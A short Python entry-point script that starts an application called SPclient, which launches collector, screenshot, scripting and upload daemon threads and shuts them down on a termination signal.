# -*- coding: utf-8 -*-
# from __future__ import unicode_literals

import os
import sys
import signal
import time
from services.screenshoter import Screenshoter
from services.scripter import Scripter
from services.uploader import Uploader
from services.collector import Collector
import logger
from config import config
import utils
from utils import fmt


log = logger.getLogger(config['NAME'], config['LOGLEVEL'])


class SPclient():

    def __init__(self):
        self.datadir = os.path.join(config['HOME_DIR'], config['NAME'], utils.getUserName())
        self.daemons = []
        signal.signal(signal.SIGTERM, self.signal_term)

        self.daemons.append(Collector())
        self.daemons.append(Screenshoter())
        self.daemons.append(Scripter())
        self.daemons.append(Uploader())

        utils.makedirs(self.datadir)

    def signal_term(self, signum, frame):
        log.debug(fmt('Get Signal: {0}', signum))
        self.stop()

    def start(self):
        for d in self.daemons:
            d.start()
        self.wait_termination()

    def stop(self):
        for d in self.daemons:
            d.stop()

    def wait_termination(self):
        for d in self.daemons:
            try:
                d.join()
            except:
                pass


if __name__ == '__main__':
    log.debug(fmt("PID={0}", os.getpid()))
    SPclient().start()

    log.debug('Exit')
